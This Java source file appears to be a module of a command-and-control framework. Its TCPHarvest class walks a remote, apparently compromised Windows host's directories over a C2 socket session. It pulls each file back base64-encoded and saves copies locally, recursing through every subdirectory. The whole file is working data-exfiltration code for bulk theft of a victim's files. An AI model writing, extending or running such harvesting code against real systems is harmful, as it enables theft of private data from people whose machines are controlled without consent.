package c2.tcp.harvest;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;

import c2.Commands;
import c2.session.IOManager;
import c2.tcp.SocketReader;

public class TCPHarvest {

	private SocketReader lsr;
	private IOManager io;
	private int sessionId;
	private OutputStreamWriter bw;
	private Path rootPath;
	
	public TCPHarvest(SocketReader lsr, IOManager io, int sessionId, OutputStreamWriter bw, Path rootPath) {
		this.lsr = lsr;
		this.io = io;
		this.sessionId = sessionId;
		this.bw = bw;
		this.rootPath = rootPath;
	}
	
	public void harvestPwd(String absoluteDirectory) throws IOException{
		//System.out.println("Getting to dir: " + absoluteDirectory);
		lsr.executeCd(Commands.CLIENT_CMD_CD + " " + absoluteDirectory, io, bw, sessionId);
		String currentDirectoryContents = lsr.getCurrentDirectoryNativeFormat(io, bw, sessionId);
		//System.out.println("Have dir: " + currentDirectoryContents);
		List<String> directoriesAbsoluteFileName = lsr.getCurrentDirectoriesFromNativeFormatDump(absoluteDirectory, currentDirectoryContents);
		//System.out.println("Processed dirs: " + directoriesAbsoluteFileName.size());
		List<String> filesAbsoluteFileNames = lsr.getCurrentFilesFromNativeFormatDump(absoluteDirectory, currentDirectoryContents);
		//System.out.println("Processed files: " + filesAbsoluteFileNames.size());
		
		for(String file : filesAbsoluteFileNames) {
			//System.out.println("Polling file: " + file);
			try {
				String b64File = lsr.uplinkFileBase64(file, bw, sessionId);
				byte fileContents[] = Base64.getDecoder().decode(b64File);
				String manuallyDeWindowsedFilename = file.substring(3);
				manuallyDeWindowsedFilename = manuallyDeWindowsedFilename.replace("\\", "/");
				Path filenamePath = Paths.get(manuallyDeWindowsedFilename);
				Path localFilePath = Paths.get(rootPath.toString(), filenamePath.toString());
				
				Files.createDirectories(localFilePath.getParent());
				Files.write(localFilePath, fileContents);
				io.sendIO(sessionId, "Harvested File: " + file + System.lineSeparator());
			}catch(Exception ex) {
				ex.printStackTrace();
				io.sendIO(sessionId, "Unable to harvest file: " + file + System.lineSeparator());
			}
		}
		
		for(String directory : directoriesAbsoluteFileName) {
			harvestPwd(directory);
		}	
	}
}
